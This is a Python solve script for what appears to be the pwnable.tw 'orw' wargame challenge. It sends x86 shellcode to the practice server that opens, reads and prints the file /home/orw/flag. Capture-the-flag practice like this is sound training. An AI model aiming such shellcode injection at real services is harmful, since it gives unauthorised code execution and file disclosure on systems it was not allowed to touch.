#!/usr/bin/env python3
import socket
import time
import sys

shellcode = bytes.fromhex("31c0506867616c66682f72772f682f686f6d89e331c931d2b005cd8089c389e131d2b26431c0b003cd8089c231c0b004b301cd8031c040cd80")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    
    print("Connecting...")
    s.connect(("chall.pwnable.tw", 10001))
    
    print("Receiving prompt...")
    data = s.recv(1024)
    print(f"Prompt: {data.decode()}")
    
    print("Sending shellcode...")
    s.send(shellcode)
    
    print("Waiting for response...")
    time.sleep(2)
    
    # Try to get response
    response = s.recv(1024)
    if response:
        print(f"Response: {response}")
    else:
        print("No immediate response")
    
    # Try to get more data
    s.settimeout(5)
    try:
        while True:
            data = s.recv(1024)
            if not data:
                break
            print(f"Data: {data}")
    except socket.timeout:
        print("No more data")
    
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()
